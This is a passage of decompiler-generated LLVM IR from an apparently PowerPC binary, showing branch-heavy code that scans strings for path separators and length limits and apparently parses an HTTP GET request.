  store i32 %v5_1000174c, i32* %r0.global-to-local, align 4
  %v1_10001750 = icmp ult i8 %v4_1000174c, 47
  %v2_10001750 = icmp ugt i8 %v4_1000174c, 47
  %v3_10001750 = icmp eq i8 %v4_1000174c, 47
  store i1 %v1_10001750, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001750, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001750, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001750, label %dec_label_pc_10001a9c, label %dec_label_pc_10001758

dec_label_pc_10001758:                            ; preds = %dec_label_pc_1000174c, %dec_label_pc_10001ab4, %dec_label_pc_10001a9c, %dec_label_pc_10001ad8
  store i32 10, i32* %r9.global-to-local, align 4
  store i32 1195725824, i32* %r0.global-to-local, align 4
  %v2_10001764 = load i32, i32* @r30, align 4
  %v3_10001764 = add i32 %v2_10001764, -529
  %v4_10001764 = inttoptr i32 %v3_10001764 to i8*
  store i8 10, i8* %v4_10001764, align 1
  %v0_10001768 = load i32, i32* %r0.global-to-local, align 4
  %v1_10001768 = load i32, i32* @r30, align 4
  %v2_10001768 = add i32 %v1_10001768, 898
  %v3_10001768 = inttoptr i32 %v2_10001768 to i32*
  store i32 %v0_10001768, i32* %v3_10001768, align 4
  br label %dec_label_pc_10000824

dec_label_pc_10001770:                            ; preds = %dec_label_pc_10000f14
  store i32 0, i32* %r31.global-to-local, align 4
  %v1_10001774 = load i32, i32* @r30, align 4
  %v2_10001774 = add i32 %v1_10001774, 931
  %v3_10001774 = inttoptr i32 %v2_10001774 to i32*
  store i32 0, i32* %v3_10001774, align 4
  br label %dec_label_pc_10000fbc

dec_label_pc_1000177c:                            ; preds = %dec_label_pc_10001658, %dec_label_pc_10001598, %dec_label_pc_10001574
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_10001780 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10001780, i32* %r4.global-to-local, align 4
  %v0_1000178c = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_1000178c, i32* %r3.global-to-local, align 4
  %v0_10001790 = load i32, i32* %r23.global-to-local, align 4
  %v1_10001790 = add i32 %v0_10001790, 1431
  store i32 %v1_10001790, i32* @r31, align 4
  store i32 268441496, i32* %lr.global-to-local, align 4
  %v5_10001794 = call i32 @function_1000ac30(i32 %v0_1000178c, i32 %v0_10001780, i32 ptrtoint ([5 x i8]* @global_var_1000de58.37 to i32), i32 4)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 %v5_10001794, i32* %r29.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1000de74.45 to i32), i32* %r4.global-to-local, align 4
  %v0_100017a4 = load i32, i32* @r31, align 4
  store i32 %v0_100017a4, i32* %r3.global-to-local, align 4
  store i32 268441516, i32* %lr.global-to-local, align 4
  %v3_100017a8 = inttoptr i32 %v0_100017a4 to i8*
  %v4_100017a8 = call i32 @function_1000afc0(i8* %v3_100017a8, i32 ptrtoint ([5 x i8]* @global_var_1000de74.45 to i32))
  store i32 %v4_100017a8, i32* %r3.global-to-local, align 4
  %v1_100017ac = icmp slt i32 %v4_100017a8, 0
  %v2_100017ac = icmp sgt i32 %v4_100017a8, 0
  %v3_100017ac = icmp eq i32 %v4_100017a8, 0
  store i1 %v1_100017ac, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100017ac, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100017ac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100017ac, label %dec_label_pc_1000191c, label %dec_label_pc_100017b4

dec_label_pc_100017b4:                            ; preds = %dec_label_pc_1000191c, %dec_label_pc_1000177c
  store i32 7, i32* %r0.global-to-local, align 4
  %v2_100017b8 = load i32, i32* @r30, align 4
  %v3_100017b8 = add i32 %v2_100017b8, -529
  %v4_100017b8 = inttoptr i32 %v3_100017b8 to i8*
  store i8 7, i8* %v4_100017b8, align 1
  br label %dec_label_pc_100017bc

dec_label_pc_100017bc:                            ; preds = %dec_label_pc_1000193c, %dec_label_pc_10001b78, %dec_label_pc_100017b4
  %v0_100017bc = load i32, i32* @r30, align 4
  %v1_100017bc = add i32 %v0_100017bc, -533
  %v2_100017bc = inttoptr i32 %v1_100017bc to i32*
  %v3_100017bc = load i32, i32* %v2_100017bc, align 4
  store i32 %v3_100017bc, i32* %r3.global-to-local, align 4
  %v0_100017c0 = load i32, i32* %r29.global-to-local, align 4
  %v0_100017c4 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_100017c4, i32* %r4.global-to-local, align 4
  store i32 268441552, i32* @lr, align 4
  %v4_100017cc = call i32 @function_1000c090(i32 %v3_100017bc, i32 %v0_100017c4, i32 %v0_100017c0, i32 16384)
  store i32 %v4_100017cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000824

dec_label_pc_100017d4:                            ; preds = %dec_label_pc_10000cd0
  %v1_100017d4 = icmp slt i32 %v0_100017d4, 10239
  %v2_100017d4 = icmp sgt i32 %v0_100017d4, 10239
  %v3_100017d4 = icmp eq i32 %v0_100017d4, 10239
  store i1 %v1_100017d4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100017d4, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100017d4, i1* %cr7_eq.global-to-local, align 1
  %tmp85 = icmp slt i32 %v0_100017d4, 10240
  br i1 %tmp85, label %dec_label_pc_10000824, label %dec_label_pc_10000cf4

dec_label_pc_100017e0:                            ; preds = %dec_label_pc_10001524
  store i32 104, i32* %r0.global-to-local, align 4
  %v1_100017e4 = load i32, i32* @r31, align 4
  %v2_100017e4 = inttoptr i32 %v1_100017e4 to i32*
  store i32 104, i32* %v2_100017e4, align 4
  br label %dec_label_pc_10001558

dec_label_pc_100017ec:                            ; preds = %dec_label_pc_100012f0
  %v0_100017ec = load i32, i32* %r25.global-to-local, align 4
  %v1_100017ec = inttoptr i32 %v0_100017ec to i32*
  %v2_100017ec = load i32, i32* %v1_100017ec, align 4
  store i32 %v2_100017ec, i32* %r0.global-to-local, align 4
  %v1_100017f0 = icmp slt i32 %v2_100017ec, 11
  %v2_100017f0 = icmp sgt i32 %v2_100017ec, 11
  %v3_100017f0 = icmp eq i32 %v2_100017ec, 11
  store i1 %v1_100017f0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100017f0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100017f0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100017f0, label %dec_label_pc_10000824, label %dec_label_pc_10001414

dec_label_pc_100017fc:                            ; preds = %dec_label_pc_100011a4
  store i32 7, i32* %r11.global-to-local, align 4
  %v1_10001800 = load i32, i32* @r1, align 4
  %v2_10001800 = add i32 %v1_10001800, 8
  %v3_10001800 = inttoptr i32 %v2_10001800 to i32*
  store i32 7, i32* %v3_10001800, align 4
  %v0_10001804 = load i32, i32* %r29.global-to-local, align 4
  %v1_10001804 = add i32 %v0_10001804, 4
  %v2_10001804 = inttoptr i32 %v1_10001804 to i8*
  %v3_10001804 = load i8, i8* %v2_10001804, align 1
  %v4_10001804 = zext i8 %v3_10001804 to i32
  store i32 %v4_10001804, i32* %r0.global-to-local, align 4
  %v1_10001808 = icmp ult i8 %v3_10001804, 115
  %v2_10001808 = icmp ugt i8 %v3_10001804, 115
  %v3_10001808 = icmp eq i8 %v3_10001804, 115
  store i1 %v1_10001808, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001808, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001808, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001808, label %dec_label_pc_10001a5c, label %dec_label_pc_10001810

dec_label_pc_10001810:                            ; preds = %dec_label_pc_100017fc, %dec_label_pc_10001a5c
  %v0_10001814 = phi i32 [ %v0_10001804, %dec_label_pc_100017fc ], [ %v0_10001814.pre, %dec_label_pc_10001a5c ]
  %v0_10001810 = load i32, i32* @r1, align 4
  %v1_10001810 = add i32 %v0_10001810, 8
  %v2_10001810 = inttoptr i32 %v1_10001810 to i32*
  %v3_10001810 = load i32, i32* %v2_10001810, align 4
  store i32 %v0_10001814, i32* %r3.global-to-local, align 4
  %v1_10001818 = load i32, i32* %r28.global-to-local, align 4
  %v2_10001818 = sub i32 %v1_10001818, %v3_10001810
  %v2_1000181c = add i32 %v3_10001810, %v0_10001814
  store i32 %v2_1000181c, i32* %r4.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10001824.46 to i32), i32* @lr, align 4
  %v3_10001820 = call i32 @function_1000bbec(i32 %v0_10001814, i32 %v2_1000181c, i32 %v2_10001818)
  store i32 %v3_10001820, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_10001828 = load i32, i32* @r1, align 4
  %v2_10001828 = add i32 %v1_10001828, 8
  %v3_10001828 = inttoptr i32 %v2_10001828 to i32*
  store i32 0, i32* %v3_10001828, align 4
  %v0_1000182c = load i32, i32* %r20.global-to-local, align 4
  %v1_1000182c = load i32, i32* @r31, align 4
  %v2_1000182c = add i32 %v1_1000182c, %v0_1000182c
  %v3_1000182c = inttoptr i32 %v2_1000182c to i8*
  %v4_1000182c = load i8, i8* %v3_1000182c, align 1
  %v5_1000182c = zext i8 %v4_1000182c to i32
  store i32 %v5_1000182c, i32* %r3.global-to-local, align 4
  %v2_10001830 = icmp ne i8 %v4_1000182c, 0
  %v3_10001830 = icmp eq i8 %v4_1000182c, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001830, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001830, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001830, label %dec_label_pc_10001870, label %dec_label_pc_10001838

dec_label_pc_10001838:                            ; preds = %dec_label_pc_10001810
  %v1_10001838 = icmp ult i8 %v4_1000182c, 47
  %v2_10001838 = icmp ugt i8 %v4_1000182c, 47
  %v3_10001838 = icmp eq i8 %v4_1000182c, 47
  store i1 %v1_10001838, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001838, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001838, i1* %cr7_eq.global-to-local, align 1
  %v0_1000183c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000183c, i32* %r9.global-to-local, align 4
  br i1 %v3_10001838, label %dec_label_pc_100019c0, label %dec_label_pc_10001844

dec_label_pc_10001844:                            ; preds = %dec_label_pc_10001838
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10001858

dec_label_pc_1000184c:                            ; preds = %dec_label_pc_10001858
  %v1_1000184c = icmp ult i8 %v4_10001864, 47
  %v2_1000184c = icmp ugt i8 %v4_10001864, 47
  %v3_1000184c = icmp eq i8 %v4_10001864, 47
  store i1 %v1_1000184c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000184c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000184c, i1* %cr7_eq.global-to-local, align 1
  %v1_10001850 = add i32 %v0_1000185c, 1
  store i32 %v1_10001850, i32* %r4.global-to-local, align 4
  br i1 %v3_1000184c, label %dec_label_pc_100019c0, label %dec_label_pc_10001858

dec_label_pc_10001858:                            ; preds = %dec_label_pc_1000184c, %dec_label_pc_10001844
  %v0_10001858 = phi i32 [ %v1_10001850, %dec_label_pc_1000184c ], [ 1, %dec_label_pc_10001844 ]
  %v1_10001858 = load i32, i32* @r1, align 4
  %v2_10001858 = add i32 %v1_10001858, 8
  %v3_10001858 = inttoptr i32 %v2_10001858 to i32*
  store i32 %v0_10001858, i32* %v3_10001858, align 4
  %v0_1000185c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1000185c, i32* %r11.global-to-local, align 4
  %v0_10001860 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001860 = add i32 %v0_10001860, %v0_1000185c
  store i32 %v2_10001860, i32* %r9.global-to-local, align 4
  %v3_10001864 = inttoptr i32 %v2_10001860 to i8*
  %v4_10001864 = load i8, i8* %v3_10001864, align 1
  %v5_10001864 = zext i8 %v4_10001864 to i32
  store i32 %v5_10001864, i32* %r0.global-to-local, align 4
  %v2_10001868 = icmp ne i8 %v4_10001864, 0
  %v3_10001868 = icmp eq i8 %v4_10001864, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001868, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001868, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001868, label %dec_label_pc_10001870, label %dec_label_pc_1000184c

dec_label_pc_10001870:                            ; preds = %dec_label_pc_10001858, %dec_label_pc_10001810, %dec_label_pc_100019c0
  %v0_10001870 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10001870, i32* %r3.global-to-local, align 4
  store i32 268441720, i32* @lr, align 4
  %v1_10001874 = inttoptr i32 %v0_10001870 to i8*
  %v2_10001874 = call i32 @function_1000ab64(i8* %v1_10001874)
  store i32 %v2_10001874, i32* %r3.global-to-local, align 4
  %v1_10001878 = icmp slt i32 %v2_10001874, 0
  %v2_10001878 = icmp sgt i32 %v2_10001874, 0
  %v3_10001878 = icmp eq i32 %v2_10001874, 0
  store i1 %v1_10001878, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001878, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001878, i1* %cr7_eq.global-to-local, align 1
  %tmp86 = icmp slt i32 %v2_10001874, 1
  br i1 %tmp86, label %dec_label_pc_1000189c, label %dec_label_pc_10001880

dec_label_pc_10001880:                            ; preds = %dec_label_pc_10001870
  %v0_10001880 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10001880, i32* %r3.global-to-local, align 4
  store i32 268441736, i32* @lr, align 4
  %v1_10001884 = inttoptr i32 %v0_10001880 to i8*
  %v2_10001884 = call i32 @function_1000ab64(i8* %v1_10001884)
  store i32 %v2_10001884, i32* %r3.global-to-local, align 4
  %v1_10001888 = icmp slt i32 %v2_10001884, 127
  %v2_10001888 = icmp sgt i32 %v2_10001884, 127
  %v3_10001888 = icmp eq i32 %v2_10001884, 127
  store i1 %v1_10001888, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001888, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001888, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10001888, label %dec_label_pc_1000189c, label %dec_label_pc_10001890

dec_label_pc_10001890:                            ; preds = %dec_label_pc_10001880
  %v0_10001890 = load i32, i32* %r23.global-to-local, align 4
  %v1_10001890 = add i32 %v0_10001890, 789
  store i32 %v1_10001890, i32* @r3, align 4
  %v0_10001894 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10001894, i32* %r4.global-to-local, align 4
  store i32 268441756, i32* %lr.global-to-local, align 4
  %v2_10001898 = inttoptr i32 %v1_10001890 to i8*
  %v3_10001898 = call i32 @function_1000ab8c(i8* %v2_10001898, i32 %v0_10001894)
  store i32 %v3_10001898, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000189c

dec_label_pc_1000189c:                            ; preds = %dec_label_pc_10001880, %dec_label_pc_10001870, %dec_label_pc_10001890
  %v0_1000189c = load i32, i32* @r1, align 4
  %v1_1000189c = add i32 %v0_1000189c, 8
  %v2_1000189c = inttoptr i32 %v1_1000189c to i32*
  %v3_1000189c = load i32, i32* %v2_1000189c, align 4
  %v0_100018a0 = load i32, i32* %r29.global-to-local, align 4
  %v2_100018a0 = add i32 %v3_1000189c, 1
  %v1_100018a4 = add i32 %v2_100018a0, %v0_100018a0
  store i32 %v1_100018a4, i32* %r3.global-to-local, align 4
  store i32 268441772, i32* @lr, align 4
  %v1_100018a8 = inttoptr i32 %v1_100018a4 to i8*
  %v2_100018a8 = call i32 @function_1000ab64(i8* %v1_100018a8)
  store i32 %v2_100018a8, i32* %r3.global-to-local, align 4
  %v1_100018ac = icmp slt i32 %v2_100018a8, 255
  %v2_100018ac = icmp sgt i32 %v2_100018a8, 255
  %v3_100018ac = icmp eq i32 %v2_100018a8, 255
  store i1 %v1_100018ac, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100018ac, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100018ac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100018ac, label %dec_label_pc_100011e4, label %dec_label_pc_100018b4

dec_label_pc_100018b4:                            ; preds = %dec_label_pc_1000189c
  %v0_100018b4 = load i32, i32* @r30, align 4
  store i32 %v0_100018b4, i32* @r3, align 4
  store i32 255, i32* @r4, align 4
  store i32 268441792, i32* @lr, align 4
  %v0_100018bc = call i32 @function_1000ac0c()
  store i32 %v0_100018bc, i32* %r3.global-to-local, align 4
  %v0_100018c0 = load i32, i32* @r1, align 4
  %v1_100018c0 = add i32 %v0_100018c0, 8
  %v2_100018c0 = inttoptr i32 %v1_100018c0 to i32*
  %v3_100018c0 = load i32, i32* %v2_100018c0, align 4
  %v0_100018c4 = load i32, i32* %r29.global-to-local, align 4
  %v2_100018c4 = add i32 %v3_100018c0, 1
  %v1_100018c8 = add i32 %v2_100018c4, %v0_100018c4
  store i32 %v1_100018c8, i32* %r3.global-to-local, align 4
  store i32 268441808, i32* @lr, align 4
  %v1_100018cc = inttoptr i32 %v1_100018c8 to i8*
  %v2_100018cc = call i32 @function_1000ab64(i8* %v1_100018cc)
  store i32 %v2_100018cc, i32* %r3.global-to-local, align 4
  %v1_100018d0 = icmp slt i32 %v2_100018cc, 0
  %v2_100018d0 = icmp sgt i32 %v2_100018cc, 0
  %v3_100018d0 = icmp eq i32 %v2_100018cc, 0
  store i1 %v1_100018d0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100018d0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100018d0, i1* %cr7_eq.global-to-local, align 1
  %tmp87 = icmp slt i32 %v2_100018cc, 1
  br i1 %tmp87, label %dec_label_pc_100011e4, label %dec_label_pc_100018d8

dec_label_pc_100018d8:                            ; preds = %dec_label_pc_10001a40, %dec_label_pc_100018b4
  %v0_100018d8 = load i32, i32* @r1, align 4
  %v1_100018d8 = add i32 %v0_100018d8, 8
  %v2_100018d8 = inttoptr i32 %v1_100018d8 to i32*
  %v3_100018d8 = load i32, i32* %v2_100018d8, align 4
  %v0_100018dc = load i32, i32* @r30, align 4
  store i32 %v0_100018dc, i32* @r3, align 4
  %v0_100018e0 = load i32, i32* %r29.global-to-local, align 4
  %v2_100018e0 = add i32 %v3_100018d8, 1
  %v1_100018e4 = add i32 %v2_100018e0, %v0_100018e0
  store i32 %v1_100018e4, i32* %r4.global-to-local, align 4
  store i32 268441836, i32* %lr.global-to-local, align 4
  %v2_100018e8 = inttoptr i32 %v0_100018dc to i8*
  %v3_100018e8 = call i32 @function_1000ab8c(i8* %v2_100018e8, i32 %v1_100018e4)
  store i32 %v3_100018e8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100011e4

dec_label_pc_100018f0:                            ; preds = %dec_label_pc_10000ca8
  %v0_100018f0 = load i32, i32* @r30, align 4
  %v1_100018f0 = add i32 %v0_100018f0, -533
  %v2_100018f0 = inttoptr i32 %v1_100018f0 to i32*
  %v3_100018f0 = load i32, i32* %v2_100018f0, align 4
  store i32 %v3_100018f0, i32* %r3.global-to-local, align 4
  store i32 268441848, i32* @lr, align 4
  %v0_100018f4 = call i32 @function_1000b3f0()
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10001900 = load i32, i32* @r30, align 4
  %v2_10001900 = add i32 %v1_10001900, -533
  %v3_10001900 = inttoptr i32 %v2_10001900 to i32*
  store i32 -1, i32* %v3_10001900, align 4
  %v0_10001904 = load i32, i32* %r0.global-to-local, align 4
  %v1_10001904 = trunc i32 %v0_10001904 to i8
  %v2_10001904 = load i32, i32* @r30, align 4
  %v3_10001904 = add i32 %v2_10001904, -529
  %v4_10001904 = inttoptr i32 %v3_10001904 to i8*
  store i8 %v1_10001904, i8* %v4_10001904, align 1
  br label %dec_label_pc_10000824

dec_label_pc_1000190c:                            ; preds = %dec_label_pc_1000154c
  %v0_1000190c = load i32, i32* @r30, align 4
  %v1_1000190c = add i32 %v0_1000190c, -529
  %v2_1000190c = inttoptr i32 %v1_1000190c to i8*
  %v3_1000190c = load i8, i8* %v2_1000190c, align 1
  %v4_1000190c = zext i8 %v3_1000190c to i32
  store i32 %v4_1000190c, i32* %r0.global-to-local, align 4
  %v2_10001910 = icmp ne i8 %v3_1000190c, 0
  %v3_10001910 = icmp eq i8 %v3_1000190c, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001910, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001910, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001910, label %dec_label_pc_10000824, label %dec_label_pc_100011e4

dec_label_pc_1000191c:                            ; preds = %dec_label_pc_1000177c
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_10001920 = load i32, i32* @r31, align 4
  store i32 %v0_10001920, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1000de40.7 to i32), i32* %r4.global-to-local, align 4
  store i32 268441900, i32* %lr.global-to-local, align 4
  %v3_10001928 = inttoptr i32 %v0_10001920 to i8*
  %v4_10001928 = call i32 @function_1000afc0(i8* %v3_10001928, i32 ptrtoint ([4 x i8]* @global_var_1000de40.7 to i32))
  store i32 %v4_10001928, i32* %r3.global-to-local, align 4
  %v1_1000192c = icmp slt i32 %v4_10001928, 0
  %v2_1000192c = icmp sgt i32 %v4_10001928, 0
  %v3_1000192c = icmp eq i32 %v4_10001928, 0
  store i1 %v1_1000192c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000192c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000192c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000192c, label %dec_label_pc_10001934, label %dec_label_pc_100017b4

dec_label_pc_10001934:                            ; preds = %dec_label_pc_1000191c
  %v0_10001934 = load i32, i32* %r24.global-to-local, align 4
  %v1_10001934 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001934 = icmp slt i32 %v0_10001934, %v1_10001934
  %v3_10001934 = icmp sgt i32 %v0_10001934, %v1_10001934
  %v4_10001934 = icmp eq i32 %v0_10001934, %v1_10001934
  store i1 %v2_10001934, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001934, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10001934, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001934, label %dec_label_pc_1000193c, label %dec_label_pc_10001b78

dec_label_pc_1000193c:                            ; preds = %dec_label_pc_10001934
  store i32 10, i32* %r0.global-to-local, align 4
  %v2_10001940 = load i32, i32* @r30, align 4
  %v3_10001940 = add i32 %v2_10001940, -529
  %v4_10001940 = inttoptr i32 %v3_10001940 to i8*
  store i8 10, i8* %v4_10001940, align 1
  br label %dec_label_pc_100017bc

dec_label_pc_10001948:                            ; preds = %dec_label_pc_1000142c
  %v1_10001948 = add i32 %v0_10001454, 1579
  %v2_10001948 = inttoptr i32 %v1_10001948 to i32*
  %v3_10001948 = load i32, i32* %v2_10001948, align 4
  store i32 %v3_10001948, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  store i32 268441948, i32* %lr.global-to-local, align 4
  %v3_10001958 = call i32 @function_1000a238(i32 36, i32* null)
  %v0_1000195c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000195c, i32* %r4.global-to-local, align 4
  %v0_10001968 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10001968, i32* %r3.global-to-local, align 4
  store i32 268441968, i32* %lr.global-to-local, align 4
  %v4_1000196c = call i32 @function_1000ac30(i32 %v0_10001968, i32 %v0_1000195c, i32 %v3_10001958, i32 11)
  store i32 %v4_1000196c, i32* %r3.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_10001974 = load i32, i32* @r30, align 4
  %v1_10001974 = add i32 %v0_10001974, 1579
  %v2_10001974 = inttoptr i32 %v1_10001974 to i32*
  %v3_10001974 = load i32, i32* %v2_10001974, align 4
  %v0_10001978 = load i32, i32* %r27.global-to-local, align 4
  %v2_10001978 = add i32 %v0_10001978, %v4_1000196c
  store i32 %v2_10001978, i32* %r31.global-to-local, align 4
  store i32 %v4_1000196c, i32* %r29.global-to-local, align 4
  %v2_10001984 = sub i32 %v3_10001974, %v4_1000196c
  store i32 %v2_10001984, i32* %r4.global-to-local, align 4
  store i32 %v2_10001978, i32* %r3.global-to-local, align 4
  store i32 268442004, i32* %lr.global-to-local, align 4
  %v4_10001990 = call i32 @function_1000ac30(i32 %v2_10001978, i32 %v2_10001984, i32 ptrtoint (i32* @global_var_1000de7c.47 to i32), i32 1)
  store i32 %v4_10001990, i32* %r3.global-to-local, align 4
  %v0_10001994 = load i32, i32* @r30, align 4
  %v1_10001994 = add i32 %v0_10001994, 935
  %v2_10001994 = inttoptr i32 %v1_10001994 to i32*
  %v3_10001994 = load i32, i32* %v2_10001994, align 4
  store i32 %v3_10001994, i32* %r0.global-to-local, align 4
  %v0_10001998 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001998 = add i32 %v0_10001998, %v4_10001990
  store i32 %v2_10001998, i32* %r28.global-to-local, align 4
  %v1_1000199c = icmp slt i32 %v3_10001994, 4
  %v2_1000199c = icmp sgt i32 %v3_10001994, 4
  %v3_1000199c = icmp eq i32 %v3_10001994, 4
  store i1 %v1_1000199c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000199c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000199c, i1* %cr7_eq.global-to-local, align 1
  %v1_100019a0 = load i32, i32* %r23.global-to-local, align 4
  %v2_100019a0 = add i32 %v1_100019a0, %v2_10001998
  store i32 %v2_100019a0, i32* %r9.global-to-local, align 4
  %v0_100019a4 = load i32, i32* %r26.global-to-local, align 4
  %v1_100019a4 = trunc i32 %v0_100019a4 to i8
  %v3_100019a4 = add i32 %v2_100019a0, 2115
  %v4_100019a4 = inttoptr i32 %v3_100019a4 to i8*
  store i8 %v1_100019a4, i8* %v4_100019a4, align 1
  %v0_100019a8 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_100019a8 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_100019a8 = or i1 %v0_100019a8, %v1_100019a8
  br i1 %v2_100019a8, label %dec_label_pc_10001b90, label %dec_label_pc_100019ac

dec_label_pc_100019ac:                            ; preds = %dec_label_pc_10001948, %dec_label_pc_10001b90, %dec_label_pc_10001ba0
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_100019b4 = load i32, i32* @r30, align 4
  %v2_100019b4 = add i32 %v1_100019b4, 931
  %v3_100019b4 = inttoptr i32 %v2_100019b4 to i32*
  store i32 -1, i32* %v3_100019b4, align 4
  %v0_100019b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100019b8 = trunc i32 %v0_100019b8 to i8
  %v2_100019b8 = load i32, i32* @r30, align 4
  %v3_100019b8 = add i32 %v2_100019b8, -529
  %v4_100019b8 = inttoptr i32 %v3_100019b8 to i8*
  store i8 %v1_100019b8, i8* %v4_100019b8, align 1
  br label %dec_label_pc_10000824

dec_label_pc_100019c0:                            ; preds = %dec_label_pc_1000184c, %dec_label_pc_10001838
  %v2_100019c4 = phi i32 [ %v0_1000183c, %dec_label_pc_10001838 ], [ %v2_10001860, %dec_label_pc_1000184c ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_100019c4 = inttoptr i32 %v2_100019c4 to i8*
  store i8 0, i8* %v3_100019c4, align 1
  br label %dec_label_pc_10001870

dec_label_pc_100019cc:                            ; preds = %dec_label_pc_10001680
  store i32 %v3_100019cc, i32* %r11.global-to-local, align 4
  %v0_100019d0 = load i32, i32* @r28, align 4
  %v2_100019d0 = add i32 %v0_100019d0, %v3_100019cc
  %v3_100019d0 = inttoptr i32 %v2_100019d0 to i8*
  %v4_100019d0 = load i8, i8* %v3_100019d0, align 1
  %v5_100019d0 = zext i8 %v4_100019d0 to i32
  store i32 %v5_100019d0, i32* %r0.global-to-local, align 4
  %v1_100019d4 = icmp ult i8 %v4_100019d0, 34
  %v2_100019d4 = icmp ugt i8 %v4_100019d0, 34
  %v3_100019d4 = icmp eq i8 %v4_100019d0, 34
  store i1 %v1_100019d4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100019d4, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100019d4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100019d4, label %dec_label_pc_100019dc, label %dec_label_pc_100016e4

dec_label_pc_100019dc:                            ; preds = %dec_label_pc_100016ac.dec_label_pc_100019dc_crit_edge, %dec_label_pc_100019cc
  %v1_100019e4 = phi i32 [ %v0_100019cc, %dec_label_pc_100019cc ], [ %v1_100019e4.pre, %dec_label_pc_100016ac.dec_label_pc_100019dc_crit_edge ]
  %v0_100019e0 = phi i32 [ %v0_100019d0, %dec_label_pc_100019cc ], [ %v0_100016d8, %dec_label_pc_100016ac.dec_label_pc_100019dc_crit_edge ]
  %v0_100019dc = phi i32 [ %v3_100019cc, %dec_label_pc_100019cc ], [ %v1_100016d8, %dec_label_pc_100016ac.dec_label_pc_100019dc_crit_edge ]
  %v1_100019dc = add i32 %v0_100019dc, 1
  store i32 %v1_100019dc, i32* %r11.global-to-local, align 4
  %v2_100019e0 = add i32 %v1_100019dc, %v0_100019e0
  store i32 %v2_100019e0, i32* %r29.global-to-local, align 4
  %v2_100019e4 = add i32 %v1_100019e4, 8
